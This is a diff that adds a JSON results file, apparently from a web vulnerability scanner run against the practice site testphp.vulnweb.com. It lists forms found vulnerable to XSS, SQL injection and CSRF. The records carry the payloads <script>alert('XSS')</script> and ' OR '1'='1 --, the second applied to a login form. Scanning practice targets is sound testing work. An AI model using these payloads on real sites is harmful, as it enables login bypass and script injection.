@@ -1,0 +1,190 @@
+{
+    "xss": [
+        {
+            "url": "http://testphp.vulnweb.com/",
+            "form": {
+                "action": "search.php?test=query",
+                "method": "post",
+                "inputs": [
+                    {
+                        "type": "text",
+                        "name": "searchFor"
+                    },
+                    {
+                        "type": "submit",
+                        "name": "goButton"
+                    }
+                ]
+            },
+            "payload": "<script>alert('XSS')</script>"
+        },
+        {
+            "url": "http://testphp.vulnweb.com/userinfo.php",
+            "form": {
+                "action": "search.php?test=query",
+                "method": "post",
+                "inputs": [
+                    {
+                        "type": "text",
+                        "name": "searchFor"
+                    },
+                    {
+                        "type": "submit",
+                        "name": "goButton"
+                    }
+                ]
+            },
+            "payload": "<script>alert('XSS')</script>"
+        },
+        {
+            "url": "http://testphp.vulnweb.com/cart.php",
+            "form": {
+                "action": "search.php?test=query",
+                "method": "post",
+                "inputs": [
+                    {
+                        "type": "text",
+                        "name": "searchFor"
+                    },
+                    {
+                        "type": "submit",
+                        "name": "goButton"
+                    }
+                ]
+            },
+            "payload": "<script>alert('XSS')</script>"
+        },
+        {
+            "url": "http://testphp.vulnweb.com/disclaimer.php",
+            "form": {
+                "action": "search.php?test=query",
+                "method": "post",
+                "inputs": [
+                    {
+                        "type": "text",
+                        "name": "searchFor"
+                    },
+                    {
+                        "type": "submit",
+                        "name": "goButton"
+                    }
+                ]
+            },
+            "payload": "<script>alert('XSS')</script>"
+        }
+    ],
+    "sqli": [
+        {
+            "url": "http://testphp.vulnweb.com/",
+            "form": {
+                "action": "search.php?test=query",
+                "method": "post",
+                "inputs": [
+                    {
+                        "type": "text",
+                        "name": "searchFor"
+                    },
+                    {
+                        "type": "submit",
+                        "name": "goButton"
+                    }
+                ]
+            },
+            "payload": "' OR '1'='1 --"
+        },
+        {
+            "url": "http://testphp.vulnweb.com/userinfo.php",
+            "form": {
+                "action": "userinfo.php",
+                "method": "post",
+                "inputs": [
+                    {
+                        "type": "text",
+                        "name": "uname"
+                    },
+                    {
+                        "type": "password",
+                        "name": "pass"
+                    }
+                ]
+            },
+            "payload": "' OR '1'='1 --"
+        },
+        {
+            "url": "http://testphp.vulnweb.com/userinfo.php",
+            "form": {
+                "action": "search.php?test=query",
+                "method": "post",
+                "inputs": [
+                    {
+                        "type": "text",
+                        "name": "searchFor"
+                    },
+                    {
+                        "type": "submit",
+                        "name": "goButton"
+                    }
+                ]
+            },
+            "payload": "' OR '1'='1 --"
+        },
+        {
+            "url": "http://testphp.vulnweb.com/cart.php",
+            "form": {
+                "action": "search.php?test=query",
+                "method": "post",
+                "inputs": [
+                    {
+                        "type": "text",
+                        "name": "searchFor"
+                    },
+                    {
+                        "type": "submit",
+                        "name": "goButton"
+                    }
+                ]
+            },
+            "payload": "' OR '1'='1 --"
+        },
+        {
+            "url": "http://testphp.vulnweb.com/disclaimer.php",
+            "form": {
+                "action": "search.php?test=query",
+                "method": "post",
+                "inputs": [
+                    {
+                        "type": "text",
+                        "name": "searchFor"
+                    },
+                    {
+                        "type": "submit",
+                        "name": "goButton"
+                    }
+                ]
+            },
+            "payload": "' OR '1'='1 --"
+        }
+    ],
+    "csrf": [
+        {
+            "url": "http://testphp.vulnweb.com/",
+            "form": "<form action=\"search.php?test=query\" method=\"post\">\n<label>search art</label>\n<input name=\"searchFor\" size=\"10\" type=\"text\"/>\n<input name=\"goButton\" type=\"submit\" value=\"go\"/>\n</form>"
+        },
+        {
+            "url": "http://testphp.vulnweb.com/userinfo.php",
+            "form": "<form action=\"userinfo.php\" method=\"post\" name=\"loginform\">\n<table cellpadding=\"4\" cellspacing=\"1\">\n<tr><td>Username : </td><td><input name=\"uname\" size=\"20\" style=\"width:120px;\" type=\"text\"/></td></t"
+        },
+        {
+            "url": "http://testphp.vulnweb.com/userinfo.php",
+            "form": "<form action=\"search.php?test=query\" method=\"post\">\n<label>search art</label>\n<input name=\"searchFor\" size=\"10\" type=\"text\"/>\n<input name=\"goButton\" type=\"submit\" value=\"go\"/>\n</form>"
+        },
+        {
+            "url": "http://testphp.vulnweb.com/cart.php",
+            "form": "<form action=\"search.php?test=query\" method=\"post\">\n<label>search art</label>\n<input name=\"searchFor\" size=\"10\" type=\"text\"/>\n<input name=\"goButton\" type=\"submit\" value=\"go\"/>\n</form>"
+        },
+        {
+            "url": "http://testphp.vulnweb.com/disclaimer.php",
+            "form": "<form action=\"search.php?test=query\" method=\"post\">\n<label>search art</label>\n<input name=\"searchFor\" size=\"10\" type=\"text\"/>\n<input name=\"goButton\" type=\"submit\" value=\"go\"/>\n</form>"
+        }
+    ]
+}
